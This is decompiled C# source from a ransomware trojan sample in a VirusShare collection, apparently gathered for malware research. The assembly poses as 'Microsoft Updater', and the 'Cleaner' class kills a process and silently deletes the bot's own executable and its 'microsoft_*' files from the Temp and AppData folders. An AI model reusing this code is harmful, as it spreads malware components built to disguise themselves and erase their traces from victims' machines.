// Decompiled with JetBrains decompiler
// Type: Epidemic_HTTP.Cleaner
// Assembly: Microsoft Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E2B3032-0636-4B8C-A49B-30EA659CCFCC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00024-msil\Trojan-Ransom.Win32.Foreign.neod-4b5461e9b7975d274b77e2b28ee9fc7a71cf3294652993dfd23081524d2a783e.exe

using System;
using System.IO;

namespace Epidemic_HTTP
{
  internal class Cleaner
  {
    private static string dir;
    private static string fileType;

    public Cleaner(string c_dir, string c_fileType)
    {
      Cleaner.dir = c_dir;
      Cleaner.fileType = c_fileType;
    }

    public void cleanBotFiles()
    {
      try
      {
        Functions.FindAndKillProcess("registry");
        File.Delete(Config.bot_file_path + "registry.exe");
        DirectoryInfo directoryInfo1 = new DirectoryInfo(Path.GetTempPath());
        DirectoryInfo directoryInfo2 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\");
        FileInfo[] files1 = directoryInfo1.GetFiles("microsoft_*." + Cleaner.fileType);
        FileInfo[] files2 = directoryInfo2.GetFiles("microsoft_*." + Cleaner.fileType);
        foreach (FileSystemInfo fileSystemInfo in files1)
          fileSystemInfo.Delete();
        foreach (FileSystemInfo fileSystemInfo in files2)
          fileSystemInfo.Delete();
      }
      catch
      {
      }
    }
  }
}
